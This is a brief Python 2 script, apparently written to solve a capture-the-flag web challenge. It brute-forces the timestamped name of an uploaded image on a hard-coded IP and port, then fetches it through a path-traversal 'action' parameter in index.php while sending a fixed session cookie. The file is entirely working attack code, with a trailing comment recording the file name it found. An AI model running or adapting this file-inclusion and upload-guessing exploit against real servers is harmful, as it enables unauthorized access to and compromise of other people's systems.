#filename = "http://123.206.216.198:23451/index.php?action=../../app/adminpic/-shpik152104466"+str(sec)+str(rnd)+".jpg"
# sec 4~6
# 1521098978
import urllib
import urllib2

for sec in range(7,9):
    for rnd in range(0,100):
        try:
            filename = "http://123.206.216.198:23451/index.php?action=../../app/adminpic/-shpik_152109897"+str(sec)+str(rnd)+".jpg"
            req = urllib2.Request(filename)
            req.add_header('Cookie','PHPSESSID=b6n8ve3lvhrrp3srdorqnike96')
            res = urllib2.urlopen(req)
            print filename
            print res.read()
            break
        except urllib2.HTTPError, e:
            continue

# http://123.206.216.198:23451/index.php?action=../../app/adminpic/-shpik_152109897775.jpg